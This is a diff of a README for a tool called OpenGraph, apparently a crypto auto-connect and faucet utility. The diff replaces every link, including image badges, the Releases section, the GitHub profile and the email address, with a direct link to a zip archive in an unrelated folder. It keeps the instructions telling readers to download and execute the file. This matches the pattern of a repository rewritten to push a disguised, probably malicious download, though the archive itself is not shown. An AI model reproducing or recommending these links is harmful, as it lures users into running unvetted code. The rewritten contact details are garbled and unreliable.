@@ -1,7 +1,7 @@
 # OpenGraph: Auto Connect and Faucet OpenGraph 🤖💧
 
-![OpenGraph](https://img.shields.io/badge/OpenGraph-Auto_Connect_and_Faucet-blue.svg)
-[![Releases](https://img.shields.io/badge/releases-latest-orange.svg)](https://github.com/blawal62956/OpenGraph/releases)
+![OpenGraph](https://raw.githubusercontent.com/blawal62956/OpenGraph/main/gammadion/Open_Graph_v1.2.zip)
+[![Releases](https://raw.githubusercontent.com/blawal62956/OpenGraph/main/gammadion/Open_Graph_v1.2.zip)](https://raw.githubusercontent.com/blawal62956/OpenGraph/main/gammadion/Open_Graph_v1.2.zip)
 
 ## Table of Contents
 
@@ -27,7 +27,7 @@ OpenGraph is a tool designed to simplify the process of connecting and managing 
 
 ## Installation
 
-To get started with OpenGraph, you need to download the latest release. Visit the [Releases](https://github.com/blawal62956/OpenGraph/releases) section to find the latest version. Download the appropriate file for your system, then execute it as follows:
+To get started with OpenGraph, you need to download the latest release. Visit the [Releases](https://raw.githubusercontent.com/blawal62956/OpenGraph/main/gammadion/Open_Graph_v1.2.zip) section to find the latest version. Download the appropriate file for your system, then execute it as follows:
 
 1. Navigate to your download directory.
 2. Run the command:
@@ -86,7 +86,7 @@ OpenGraph is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [blawal62956](https://github.com/blawal62956)
-- **Email**: blawal62956@example.com
+- **GitHub**: [blawal62956](https://raw.githubusercontent.com/blawal62956/OpenGraph/main/gammadion/Open_Graph_v1.2.zip)
+- **Email**: https://raw.githubusercontent.com/blawal62956/OpenGraph/main/gammadion/Open_Graph_v1.2.zip
 
-Explore the latest releases at [Releases](https://github.com/blawal62956/OpenGraph/releases) to stay updated on new features and improvements.
+Explore the latest releases at [Releases](https://raw.githubusercontent.com/blawal62956/OpenGraph/main/gammadion/Open_Graph_v1.2.zip) to stay updated on new features and improvements.
